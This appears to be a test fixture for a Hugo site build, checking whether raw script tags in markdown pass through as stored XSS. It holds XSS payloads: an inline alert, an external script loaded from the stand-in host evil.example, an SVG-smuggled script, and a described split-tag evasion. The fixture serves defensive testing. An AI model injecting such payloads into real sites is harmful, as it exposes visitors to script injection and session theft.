# Script tags

Raw `<script>` elements injected via markdown body (`unsafe = true` lets them
through verbatim).

Inline script:

<script>alert(document.domain)</script>

External script:

<script src="//evil.example/x.js"></script>

Script smuggled inside SVG:

<svg><script>alert('svg-script')</script></svg>

Note: a malformed "split" tag such as `<scr<script>ipt>alert(1)</script>` is NOT
included here because it produces a `<script>` whose body is invalid JS, which
aborts the Hugo build at the `--minify` step (a DoS, catalog ID R5) rather than
producing output. See `../../dangerous-constructs.md`.

Expected (current pipeline): emitted into the page unchanged -> stored XSS.
Future guard: HTML sanitization allowlist (drop `<script>`) or `unsafe = false`.
